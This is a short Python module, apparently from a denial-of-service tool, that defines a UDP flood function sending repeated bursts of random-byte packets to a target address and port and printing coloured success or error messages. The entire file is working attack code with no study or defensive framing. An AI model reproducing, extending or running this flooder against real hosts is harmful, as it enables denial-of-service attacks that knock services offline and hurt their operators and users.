import random
import socket
from os import urandom as urandom
from colorama import Fore

# Create socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)


def flood(target):
    for _ in range(16):
        try:
            payload = urandom(random.randint(1, 60))
            sock.sendto(payload, (target[0], target[1]))
        except Exception as e:
            print(
                f'{Fore.MAGENTA}Error \
                    while sending UDP packets\n{Fore.MAGENTA}{e}{Fore.RESET}'
            )
        else:
            print(
                f"{Fore.GREEN}[+] {Fore.YELLOW}UDP random packet sent! Payload \
                size: {len(payload)}. {Fore.RESET}"
            )
